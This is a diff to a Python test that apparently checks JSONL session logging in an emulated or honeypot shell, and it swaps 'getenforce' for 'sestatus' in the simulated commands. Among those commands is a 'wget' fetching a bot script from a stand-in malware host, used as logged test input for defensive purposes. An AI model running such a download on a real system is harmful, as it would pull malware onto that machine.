@@ -70,8 +70,8 @@ async def test_jsonl_logging(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) ->
     await shell.execute("pwd")
     await shell.execute("ps aux")
     await shell.execute("wget http://malware.link/bot.sh")
-    await shell.execute("getenforce")
-    await shell.execute("getenforce")
+    await shell.execute("sestatus")
+    await shell.execute("sestatus")
 
     log_path = Path("logs/sessions/sess-abc.jsonl")
     assert log_path.is_file()
@@ -80,8 +80,8 @@ async def test_jsonl_logging(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) ->
         "pwd",
         "ps aux",
         "wget http://malware.link/bot.sh",
-        "getenforce",
-        "getenforce",
+        "sestatus",
+        "sestatus",
     ]
     assert [row["execution_path"] for row in records] == [
         "vfs",
